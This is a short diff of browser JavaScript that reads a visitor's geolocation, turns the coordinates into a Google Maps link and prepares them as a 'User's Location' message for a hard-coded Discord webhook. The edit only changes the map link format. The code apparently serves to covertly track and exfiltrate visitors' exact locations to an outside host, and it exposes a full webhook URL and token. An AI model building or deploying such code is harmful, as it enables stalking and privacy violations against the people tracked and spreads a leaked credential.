@@ -45,8 +45,8 @@
                 alert("Geolocation is not supported by this browser.");} });        function sendLocation(position) {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
-            // Create a Google Maps link with a marker
-            const googleMapsLink =`https://www.google.com/maps/@?api=1&map_action=map&center=${lat},${lon}&zoom=15&markers=color:red%7Clabel:C%7C${lat},${lon}`;            const webhookUrl = 'https://discord.com/api/webhooks/1337154258281168896/NQv_m_JccepgAedCn1Le3_QindKI_voWv9L0NoI9itCIN5bpJNwXcFzDQWZRYbXH9oFb'; // Replace with your Discord webhook URL
+            // Create a Google Maps link with a marker at the exact location
+            const googleMapsLink =`https://www.google.com/maps/dir/?api=1&destination=${lat},${lon}&destination_place_id=ChIJN1t_tDeuEmsRUcIaDl1M5fI&markers=color:red%7Clabel:C%7C${lat},${lon}`;            const webhookUrl = 'https://discord.com/api/webhooks/1337154258281168896/NQv_m_JccepgAedCn1Le3_QindKI_voWv9L0NoI9itCIN5bpJNwXcFzDQWZRYbXH9oFb'; // Replace with your Discord webhook URL
             const data = {
                 content:`User's Location:${googleMapsLink}`            };
 
